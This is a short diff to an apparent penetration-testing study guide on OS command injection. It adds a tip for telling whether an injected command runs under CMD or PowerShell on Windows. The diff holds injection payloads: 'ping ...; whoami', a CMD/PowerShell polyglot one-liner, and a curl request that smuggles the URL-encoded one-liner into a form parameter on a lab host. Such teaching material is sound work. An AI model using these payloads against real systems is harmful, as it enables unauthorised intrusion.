@@ -59,6 +59,15 @@ ping -c 1 127.0.0.1; whoami
 > [!NOTE]
 > A potential error can be user input validation happening on the front-end.
 
+> [!INFO]
+> When identifying the victim machine as a Windows system, you can use the following one-liner to determine if CMD or PowerShell is running:
+> 
+> ```(dir 2>&1 *`|echo CMD);&<# rem #>echo PowerShell```
+>
+> Identifying whether your injection executes in CMD or PowerShell is critical because each uses different syntax, operators, and payload formats - so using the wrong one will cause your exploit to fail.
+> 
+> Example: `curl -X POST --data 'Archive=git%3B(dir%202%3E%261%20*%60%7Cecho%20CMD)%3B%26%3C%23%20rem%20%23%3Eecho%20PowerShell' http://192.168.50.189:8000/archive`
+
 ### Bypassing Front-End Validation
 
 The easiest method to customize the HTTP requests being sent to the back-end server is to use a web proxy that can intercept the HTTP requests being sent by the application.
